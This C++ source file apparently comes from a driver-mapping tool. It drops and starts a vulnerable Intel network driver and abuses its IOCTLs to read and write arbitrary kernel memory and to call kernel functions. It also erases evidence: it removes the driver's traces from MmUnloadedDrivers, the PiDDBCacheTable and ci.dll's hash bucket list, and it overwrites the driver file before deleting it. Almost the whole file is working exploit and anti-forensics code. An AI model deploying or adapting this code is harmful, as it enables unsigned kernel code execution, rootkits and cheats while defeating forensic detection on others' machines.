#include "intel_driver.hpp"

char intel_driver::driver_name[100] = {};
uintptr_t PiDDBLockPtr;
uintptr_t PiDDBCacheTablePtr;

bool intel_driver::IsRunning()
{
	const HANDLE file_handle = CreateFileW(L"\\\\.\\Nal", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE)
	{
		CloseHandle(file_handle);
		return true;
	}
	return false;
}

HANDLE intel_driver::Load()
{
	//Randomize name for log in registry keys, usn jornal and other shits
	memset(intel_driver::driver_name, 0, sizeof(intel_driver::driver_name));
	static const char alphanum[] =
		"abcdefghijklmnopqrstuvwxyz"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	int len = rand() % 20 + 10;
	for (int i = 0; i < len; ++i)
		intel_driver::driver_name[i] = alphanum[rand() % (sizeof(alphanum) - 1)];

	std::cout << "[<] Loading vulnerable driver" << std::endl;

	char temp_directory[MAX_PATH] = { 0 };
	const uint32_t get_temp_path_ret = GetTempPathA(sizeof(temp_directory), temp_directory);

	if (!get_temp_path_ret || get_temp_path_ret > MAX_PATH)
	{
		std::cout << "[-] Failed to get temp path" << std::endl;
		return nullptr;
	}
	if (temp_directory[strlen(temp_directory) - 1] == '\\')
		temp_directory[strlen(temp_directory) - 1] = 0x0;
	const std::string driver_path = std::string(temp_directory) + "\\" + driver_name;
	std::remove(driver_path.c_str());

	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver)))
	{
		std::cout << "[-] Failed to create vulnerable driver file" << std::endl;
		return nullptr;
	}

	if (!service::RegisterAndStart(driver_path))
	{
		std::cout << "[-] Failed to register and start service for the vulnerable driver" << std::endl;
		std::remove(driver_path.c_str());
		return nullptr;
	}

	return CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
}

void intel_driver::Unload(HANDLE device_handle)
{
	std::cout << "[<] Unloading vulnerable driver" << std::endl;

	if (device_handle && device_handle != INVALID_HANDLE_VALUE) {
		CloseHandle(device_handle);
	}

	service::StopAndRemove(driver_name);

	char temp_directory[MAX_PATH] = { 0 };

	const uint32_t get_temp_path_ret = GetTempPathA(sizeof(temp_directory), temp_directory);
	if (temp_directory[strlen(temp_directory) - 1] == '\\')
		temp_directory[strlen(temp_directory) - 1] = 0x0;
	const std::string driver_path = std::string(temp_directory) + "\\" + driver_name;

	//Destroy disk information before unlink from disk to prevent any recover of the file
	std::ofstream file_ofstream(driver_path.c_str(), std::ios_base::out | std::ios_base::binary);
	int newFileLen = sizeof(intel_driver_resource::driver) + ((long long)rand() % 2348767 + 56725);
	BYTE * randomData = new BYTE[newFileLen];
	for (size_t i = 0; i < newFileLen; i++) {
		randomData[i] = (BYTE)(rand() % 255);
	}
	if (!file_ofstream.write((char*)randomData, newFileLen))
	{
		std::cout << "[!] Error dumping shit inside the disk" << std::endl;
	}
	else {
		std::cout << "[+] Vul driver data destroyed before unlink" << std::endl;
	}
	file_ofstream.close();
	delete[] randomData;

	//unlink the file
	std::remove(driver_path.c_str());
}

bool intel_driver::MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size)
{
	if (!destination || !source || !size)
		return 0;

	COPY_MEMORY_BUFFER_INFO copy_memory_buffer = { 0 };

	copy_memory_buffer.case_number = 0x33;
	copy_memory_buffer.source = source;
	copy_memory_buffer.destination = destination;
	copy_memory_buffer.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl(device_handle, ioctl1, &copy_memory_buffer, sizeof(copy_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::SetMemory(HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size)
{
	if (!address || !size)
		return 0;

	FILL_MEMORY_BUFFER_INFO fill_memory_buffer = { 0 };

	fill_memory_buffer.case_number = 0x30;
	fill_memory_buffer.destination = address;
	fill_memory_buffer.value = value;
	fill_memory_buffer.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl(device_handle, ioctl1, &fill_memory_buffer, sizeof(fill_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::GetPhysicalAddress(HANDLE device_handle, uint64_t address, uint64_t * out_physical_address)
{
	if (!address)
		return 0;

	GET_PHYS_ADDRESS_BUFFER_INFO get_phys_address_buffer = { 0 };

	get_phys_address_buffer.case_number = 0x25;
	get_phys_address_buffer.address_to_translate = address;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(device_handle, ioctl1, &get_phys_address_buffer, sizeof(get_phys_address_buffer), nullptr, 0, &bytes_returned, nullptr))
		return false;

	*out_physical_address = get_phys_address_buffer.return_physical_address;
	return true;
}

uint64_t intel_driver::MapIoSpace(HANDLE device_handle, uint64_t physical_address, uint32_t size)
{
	if (!physical_address || !size)
		return 0;

	MAP_IO_SPACE_BUFFER_INFO map_io_space_buffer = { 0 };

	map_io_space_buffer.case_number = 0x19;
	map_io_space_buffer.physical_address_to_map = physical_address;
	map_io_space_buffer.size = size;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(device_handle, ioctl1, &map_io_space_buffer, sizeof(map_io_space_buffer), nullptr, 0, &bytes_returned, nullptr))
		return 0;

	return map_io_space_buffer.return_virtual_address;
}

bool intel_driver::UnmapIoSpace(HANDLE device_handle, uint64_t address, uint32_t size)
{
	if (!address || !size)
		return false;

	UNMAP_IO_SPACE_BUFFER_INFO unmap_io_space_buffer = { 0 };

	unmap_io_space_buffer.case_number = 0x1A;
	unmap_io_space_buffer.virt_address = address;
	unmap_io_space_buffer.number_of_bytes = size;

	DWORD bytes_returned = 0;

	return DeviceIoControl(device_handle, ioctl1, &unmap_io_space_buffer, sizeof(unmap_io_space_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::ReadMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size)
{
	return MemCopy(device_handle, reinterpret_cast<uint64_t>(buffer), address, size);
}

bool intel_driver::WriteMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size)
{
	return MemCopy(device_handle, address, reinterpret_cast<uint64_t>(buffer), size);
}

bool intel_driver::WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size)
{
	if (!address || !buffer || !size)
		return false;

	uint64_t physical_address = 0;

	if (!GetPhysicalAddress(device_handle, address, &physical_address))
	{
		std::cout << "[-] Failed to translate virtual address 0x" << reinterpret_cast<void*>(address) << std::endl;
		return false;
	}

	const uint64_t mapped_physical_memory = MapIoSpace(device_handle, physical_address, size);

	if (!mapped_physical_memory)
	{
		std::cout << "[-] Failed to map IO space of 0x" << reinterpret_cast<void*>(physical_address) << std::endl;
		return false;
	}

	bool result = WriteMemory(device_handle, mapped_physical_memory, buffer, size);

	if (!UnmapIoSpace(device_handle, mapped_physical_memory, size))
		std::cout << "[!] Failed to unmap IO space of physical address 0x" << reinterpret_cast<void*>(physical_address) << std::endl;

	return result;
}

uint64_t intel_driver::AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size)
{
	if (!size)
		return 0;

	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(device_handle, utils::GetKernelModuleAddress("ntoskrnl.exe"), "ExAllocatePoolWithTag");

	if (!kernel_ExAllocatePool)
	{
		std::cout << "[!] Failed to find ExAllocatePool" << std::endl;
		return 0;
	}

	uint64_t allocated_pool = 0;

	if (!CallKernelFunction(device_handle, &allocated_pool, kernel_ExAllocatePool, pool_type, size, 'erhT'))
		return 0;

	return allocated_pool;
}

bool intel_driver::FreePool(HANDLE device_handle, uint64_t address)
{
	if (!address)
		return 0;

	static uint64_t kernel_ExFreePool = GetKernelModuleExport(device_handle, utils::GetKernelModuleAddress("ntoskrnl.exe"), "ExFreePool");

	if (!kernel_ExFreePool) {
		std::cout << "[!] Failed to find ExAllocatePool" << std::endl;
		return 0;
	}

	return CallKernelFunction<void>(device_handle, nullptr, kernel_ExFreePool, address);
}

uint64_t intel_driver::GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string & function_name)
{
	if (!kernel_module_base)
		return 0;

	IMAGE_DOS_HEADER dos_header = { 0 };
	IMAGE_NT_HEADERS64 nt_headers = { 0 };

	if (!ReadMemory(device_handle, kernel_module_base, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
		!ReadMemory(device_handle, kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE)
		return 0;

	const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (!export_base || !export_base_size)
		return 0;

	const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (!ReadMemory(device_handle, kernel_module_base + export_base, export_data, export_base_size))
	{
		VirtualFree(export_data, 0, MEM_RELEASE);
		return 0;
	}

	const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;

	const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
	const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
	const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

	for (auto i = 0u; i < export_data->NumberOfNames; ++i)
	{
		const std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));

		if (!_stricmp(current_function_name.c_str(), function_name.c_str()))
		{
			const auto function_ordinal = ordinal_table[i];
			const auto function_address = kernel_module_base + function_table[function_ordinal];

			if (function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size)
			{
				VirtualFree(export_data, 0, MEM_RELEASE);
				return 0; // No forwarded exports on 64bit?
			}

			VirtualFree(export_data, 0, MEM_RELEASE);
			return function_address;
		}
	}

	VirtualFree(export_data, 0, MEM_RELEASE);
	return 0;
}

bool intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle)
{
	ULONG buffer_size = 0;
	void* buffer = nullptr;

	NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);

	while (status == nt::STATUS_INFO_LENGTH_MISMATCH)
	{
		VirtualFree(buffer, 0, MEM_RELEASE);

		buffer = VirtualAlloc(nullptr, buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);
	}

	if (!NT_SUCCESS(status) || buffer == 0)
	{
		if (buffer != 0)
			VirtualFree(buffer, 0, MEM_RELEASE);
		return false;
	}

	uint64_t object = 0;

	auto system_handle_inforamtion = static_cast<nt::PSYSTEM_HANDLE_INFORMATION_EX>(buffer);

	for (auto i = 0u; i < system_handle_inforamtion->HandleCount; ++i)
	{
		const nt::SYSTEM_HANDLE current_system_handle = system_handle_inforamtion->Handles[i];

		if (current_system_handle.UniqueProcessId != reinterpret_cast<HANDLE>(static_cast<uint64_t>(GetCurrentProcessId())))
			continue;

		if (current_system_handle.HandleValue == device_handle)
		{
			object = reinterpret_cast<uint64_t>(current_system_handle.Object);
			break;
		}
	}

	VirtualFree(buffer, 0, MEM_RELEASE);

	if (!object)
		return false;

	uint64_t device_object = 0;

	if (!ReadMemory(device_handle, object + 0x8, &device_object, sizeof(device_object)) || !device_object) {
		std::cout << "[!] Failed to find device_object" << std::endl;
		return false;
	}

	uint64_t driver_object = 0;

	if (!ReadMemory(device_handle, device_object + 0x8, &driver_object, sizeof(driver_object)) || !driver_object) {
		std::cout << "[!] Failed to find driver_object" << std::endl;
		return false;
	}

	uint64_t driver_section = 0;
	
	if (!ReadMemory(device_handle, driver_object + 0x28, &driver_section, sizeof(driver_section)) || !driver_section) {
		std::cout << "[!] Failed to find driver_section" << std::endl;
		return false;
	}

	UNICODE_STRING us_driver_base_dll_name = { 0 };

	if (!ReadMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0) {
		std::cout << "[!] Failed to find driver name" << std::endl;
		return false;
	}

	wchar_t * unloadedName = new wchar_t[us_driver_base_dll_name.Length];
	memset(unloadedName, 0, us_driver_base_dll_name.Length * sizeof(wchar_t));
	
	ReadMemory(device_handle, (uintptr_t)us_driver_base_dll_name.Buffer, unloadedName, us_driver_base_dll_name.Length * sizeof(wchar_t));
	
	us_driver_base_dll_name.Length = 0; //MiRememberUnloadedDriver will check if the length > 0 to save the unloaded driver

	if (!WriteMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name))) {
		std::cout << "[!] Failed to write driver name length" << std::endl;
		return false;
	}

	std::wcout << L"[+] MmUnloadedDrivers Cleaned: " << unloadedName << std::endl;

	delete[] unloadedName;

	return true;
}

PVOID intel_driver::ResolveRelativeAddress(HANDLE device_handle, _In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize) {
	ULONG_PTR Instr = (ULONG_PTR)Instruction;
	LONG RipOffset = 0;
	if (!ReadMemory(device_handle, Instr + OffsetOffset, &RipOffset, sizeof(LONG))) {
		return nullptr;
	}
	PVOID ResolvedAddr = (PVOID)(Instr + InstructionSize + RipOffset);
	return ResolvedAddr;
}

bool intel_driver::ExAcquireResourceExclusiveLite(HANDLE device_handle, PVOID Resource, BOOLEAN wait)
{
	if (!Resource)
		return 0;

	static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport(device_handle, utils::GetKernelModuleAddress("ntoskrnl.exe"), "ExAcquireResourceExclusiveLite");

	if (!kernel_ExAcquireResourceExclusiveLite) {
		std::cout << "[!] Failed to find ExAcquireResourceExclusiveLite" << std::endl;
		return 0;
	}

	BOOLEAN out;

	return (CallKernelFunction(device_handle, &out, kernel_ExAcquireResourceExclusiveLite, Resource, wait) && out);
}

bool intel_driver::ExReleaseResourceLite(HANDLE device_handle, PVOID Resource)
{
	if (!Resource)
		return false;

	static uint64_t kernel_ExReleaseResourceLite = GetKernelModuleExport(device_handle, utils::GetKernelModuleAddress("ntoskrnl.exe"), "ExReleaseResourceLite");

	if (!kernel_ExReleaseResourceLite) {
		std::cout << "[!] Failed to find ExReleaseResourceLite" << std::endl;
		return false;
	}

	return CallKernelFunction<void>(device_handle, nullptr, kernel_ExReleaseResourceLite, Resource);
}

BOOLEAN intel_driver::RtlDeleteElementGenericTableAvl(HANDLE device_handle, PVOID Table, PVOID Buffer)
{
	if (!Table)
		return false;

	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(device_handle, utils::GetKernelModuleAddress("ntoskrnl.exe"), "RtlDeleteElementGenericTableAvl");

	if (!kernel_RtlDeleteElementGenericTableAvl) {
		std::cout << "[!] Failed to find RtlDeleteElementGenericTableAvl" << std::endl;
		return false;
	}

	BOOLEAN out;

	return (CallKernelFunction(device_handle, &out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer) && out);
}

intel_driver::PiDDBCacheEntry* intel_driver::LookupEntry(HANDLE device_handle, PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp) {
	PiDDBCacheEntry* firstEntry;
	if (!ReadMemory(device_handle, (uintptr_t)PiDDBCacheTable + (offsetof(struct _RTL_AVL_TABLE, BalancedRoot.RightChild)), &firstEntry, sizeof(_RTL_BALANCED_LINKS*))) {
		return nullptr;
	}
	
	(*(uintptr_t*)&firstEntry) += sizeof(RTL_BALANCED_LINKS);

	PiDDBCacheEntry* cache_entry;
	if (!ReadMemory(device_handle, (uintptr_t)firstEntry + (offsetof(struct _PiDDBCacheEntry, List.Flink)), &cache_entry, sizeof(_LIST_ENTRY*))) {
		return nullptr;
	}
	
	while (TRUE) {
		ULONG itemTimeDateStamp = 0;
		if (!ReadMemory(device_handle, (uintptr_t)cache_entry + (offsetof(struct _PiDDBCacheEntry, TimeDateStamp)), &itemTimeDateStamp, sizeof(ULONG))) {
			return nullptr;
		}
		if (itemTimeDateStamp == timestamp) {
			printf("[+] PiDDBCacheTable result -> TimeStamp: %x\n", itemTimeDateStamp);
			return cache_entry;
		}
		if ((uintptr_t)cache_entry == (uintptr_t)firstEntry) {
			break;
		}
		if (!ReadMemory(device_handle, (uintptr_t)cache_entry + (offsetof(struct _PiDDBCacheEntry, List.Flink)), &cache_entry, sizeof(_LIST_ENTRY*))) {
			return nullptr;
		}
	}
	return nullptr;
}


bool intel_driver::ClearPiDDBCacheTable(HANDLE device_handle) { //PiDDBCacheTable added on LoadDriver
	
	uint64_t ntoskrnl = utils::GetKernelModuleAddress("ntoskrnl.exe");

	PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", ntoskrnl, (PUCHAR)"\x81\xFB\x6C\x03\x00\xC0\x0F\x84\x00\x00\x00\x00\x48\x8D\x0D", (char*)"xxxxxxxx????xxx"); // 81 FB 6C 03 00 C0 0F 84 ? ? ? ? 48 8D 0D  update for build 21286 etc...
	PiDDBCacheTablePtr = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", ntoskrnl, (PUCHAR)"\x66\x03\xD2\x48\x8D\x0D", (char*)"xxxxxx");
	if (PiDDBLockPtr == NULL || PiDDBCacheTablePtr == NULL) {
		std::cout << "[-] Warning no PiDDBCacheTable Found" << std::endl;
		return false;
	}

	printf("[+] PiDDBLock Ptr %llx\n", PiDDBLockPtr);
	printf("[+] PiDDBCacheTable Ptr %llx\n", PiDDBCacheTablePtr);

	PVOID PiDDBLock = ResolveRelativeAddress(device_handle, (PVOID)PiDDBLockPtr, 15, 19);
	PRTL_AVL_TABLE PiDDBCacheTable = (PRTL_AVL_TABLE)ResolveRelativeAddress(device_handle, (PVOID)PiDDBCacheTablePtr, 6, 10);


	SetMemory(device_handle, (uintptr_t)PiDDBCacheTable + (offsetof(struct _RTL_AVL_TABLE, TableContext)), 1, sizeof(PVOID));

	if (!ExAcquireResourceExclusiveLite(device_handle, PiDDBLock, true)) {
		std::cout << "[-] Can't lock PiDDBCacheTable" << std::endl;
		return false;
	}
	std::cout << "[+] PiDDBLock Locked" << std::endl;

	// search our entry in the table
	PiDDBCacheEntry* pFoundEntry = (PiDDBCacheEntry*)LookupEntry(device_handle,PiDDBCacheTable, iqvw64e_timestamp);
	if (pFoundEntry == nullptr) {
		std::cout << "[-] Not found in cache" << std::endl;
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	// first, unlink from the list
	PLIST_ENTRY prev;
	if (!ReadMemory(device_handle, (uintptr_t)pFoundEntry + (offsetof(struct _PiDDBCacheEntry, List.Blink)), &prev, sizeof(_LIST_ENTRY*))) {
		std::cout << "[-] Can't get prev entry" << std::endl;
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}
	PLIST_ENTRY next;
	if (!ReadMemory(device_handle, (uintptr_t)pFoundEntry + (offsetof(struct _PiDDBCacheEntry, List.Flink)), &next, sizeof(_LIST_ENTRY*))) {
		std::cout << "[-] Can't get next entry" << std::endl;
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	printf("[+] Found Table Entry = %p\n", pFoundEntry);

	if (!WriteMemory(device_handle, (uintptr_t)prev + (offsetof(struct _LIST_ENTRY, Flink)), &next, sizeof(_LIST_ENTRY*))) {
		std::cout << "[-] Can't set next entry" << std::endl;
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}
	if (!WriteMemory(device_handle, (uintptr_t)next + (offsetof(struct _LIST_ENTRY, Blink)), &prev, sizeof(_LIST_ENTRY*))) {
		std::cout << "[-] Can't set prev entry" << std::endl;
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	// then delete the element from the avl table
	if (!RtlDeleteElementGenericTableAvl(device_handle, PiDDBCacheTable, pFoundEntry)) {
		std::cout << "[-] Can't delete from PiDDBCacheTable" << std::endl;
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	// release the ddb resource lock
	ExReleaseResourceLite(device_handle, PiDDBLock);

	std::cout << "[+] PiDDBCacheTable Cleaned" << std::endl;

	return true;
}

uintptr_t intel_driver::FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, char* szMask) {
	if (!dwAddress) {
		std::cout << "[-] No module address to find pattern" << std::endl;
		return 0;
	}

	if (dwLen > 1024 * 1024 * 1024) { //if read is > 1GB
		std::cout << "[-] Can't find pattern, Too big section" << std::endl;
		return 0;
	}

	BYTE* sectionData = new BYTE[dwLen];
	ReadMemory(device_handle, dwAddress, sectionData, dwLen);

	auto result = utils::FindPattern((uintptr_t)sectionData, dwLen, bMask, szMask);

	if (result <= 0) {
		std::cout << "[-] Can't find pattern" << std::endl;
		delete[] sectionData;
		return 0;
	}
	result = dwAddress + result - (uintptr_t)sectionData;
	delete[] sectionData;
	return result;
}

uintptr_t intel_driver::FindSectionAtKernel(HANDLE device_handle, char* sectionName, uintptr_t modulePtr, PULONG size) {
	if (!modulePtr)
		return 0;
	BYTE headers[0x1000];
	if (!ReadMemory(device_handle, modulePtr, headers, 0x1000)) {
		std::cout << "[-] Can't read module headers" << std::endl;
		return 0;
	}
	ULONG sectionSize = 0;
	uintptr_t section = (uintptr_t)utils::FindSection(sectionName, (uintptr_t)headers, &sectionSize);
	if (!section || !sectionSize) {
		std::cout << "[-] Can't find section" << std::endl;
		return false;
	}
	if (size)
		*size = sectionSize;
	return section - (uintptr_t)headers + modulePtr;
}

uintptr_t intel_driver::FindPatternInSectionAtKernel(HANDLE device_handle,char* sectionName, uintptr_t modulePtr, BYTE* bMask, char* szMask) {
	ULONG sectionSize = 0;
	uintptr_t section = FindSectionAtKernel(device_handle, sectionName, modulePtr, &sectionSize);
	return FindPatternAtKernel(device_handle, section, sectionSize, bMask, szMask);
}

bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
	std::string dname(driver_name);
	std::wstring wdname(dname.begin(),dname.end());
	wdname = L"\\" + wdname;
	uint64_t ci = utils::GetKernelModuleAddress("ci.dll");

	//Thanks @KDIo3 and @Swiftik from UnknownCheats
	auto sig = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE",ci, PUCHAR("\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00"), (char*)"xxx????x?xxxxxxx");
	if (!sig) {
		std::cout << "[-] Can't Find g_KernelHashBucketList" << std::endl;
		return false;
	}
	auto sig2 = FindPatternAtKernel(device_handle,(uintptr_t)sig-50, 50, PUCHAR("\x48\x8D\x0D"), (char*)"xxx");
	if (!sig2) {
		std::cout << "[-] Can't Find g_HashCacheLock" << std::endl;
		return false;
	}
	const auto g_KernelHashBucketList = ResolveRelativeAddress(device_handle, (PVOID)sig, 3, 7);
	const auto g_HashCacheLock = ResolveRelativeAddress(device_handle, (PVOID)sig2, 3, 7);
	if (!g_KernelHashBucketList || !g_HashCacheLock)
	{
		std::cout << "[-] Can't Find g_HashCache relative address" << std::endl;
		return false;
	}

	std::wcout << L"[+] g_KernelHashBucketList Found 0x" << std::hex << g_KernelHashBucketList << std::endl;

	//// Print KernelHashBucketList
	//ULONG_PTR i = NULL;
	//ReadMemory(device_handle, (uintptr_t)g_KernelHashBucketList, &i, sizeof(i));
	//while (i)
	//{
	//	const auto wsNamePtr = PWCH(i + 0x48);
	//	wchar_t wsName[MAX_PATH];
	//	memset(wsName, 0, MAX_PATH * sizeof(wchar_t));
	//	ReadMemory(device_handle, (uintptr_t)wsNamePtr, wsName, MAX_PATH * sizeof(wchar_t));
	//	std::wcout << wsName << std::endl;
	//	ReadMemory(device_handle, (uintptr_t)i, &i, sizeof(i));
	//}

	if (!ExAcquireResourceExclusiveLite(device_handle, g_HashCacheLock, true)) {
		std::cout << "[-] Can't lock g_HashCacheLock" << std::endl;
		return false;
	}
	std::cout << "[+] g_HashCacheLock Locked" << std::endl;

	HashBucketEntry* prev = (HashBucketEntry*)g_KernelHashBucketList;
	HashBucketEntry* entry = 0;
	ReadMemory(device_handle, (uintptr_t)prev, &entry, sizeof(entry));
	if (!entry) {
		std::wcout << L"[!] g_KernelHashBucketList looks empty!" << std::endl;
		ExReleaseResourceLite(device_handle, g_HashCacheLock);
		return true;
	}
	while (entry) {
		wchar_t * wsNamePtr = 0;
		USHORT wsNameLen = 0;
		ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr));
		ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen));
				
		wchar_t* wsName = new wchar_t[wsNameLen];
		memset(wsName, 0, wsNameLen * sizeof(wchar_t));
		ReadMemory(device_handle, (uintptr_t)wsNamePtr, wsName, wsNameLen * sizeof(wchar_t));
				
		if (std::wstring(wsName).find(wdname) != std::wstring::npos) {
			std::wcout << L"[+] Found In g_KernelHashBucketList: " << wsName << std::endl;

			HashBucketEntry* Next = 0;
			ReadMemory(device_handle, (uintptr_t)entry, &Next, sizeof(Next));

			WriteMemory(device_handle, (uintptr_t)prev, &Next, sizeof(Next));

			FreePool(device_handle, (uintptr_t)entry);
			std::wcout << L"[+] g_KernelHashBucketList Cleaned" << std::endl;
			ExReleaseResourceLite(device_handle, g_HashCacheLock);
			delete[] wsName;
			return true;
		}
				
		prev = entry;
		delete[] wsName;
		//read next
		ReadMemory(device_handle, (uintptr_t)entry, &entry, sizeof(entry));
	}
	
	ExReleaseResourceLite(device_handle, g_HashCacheLock);
	return false;
}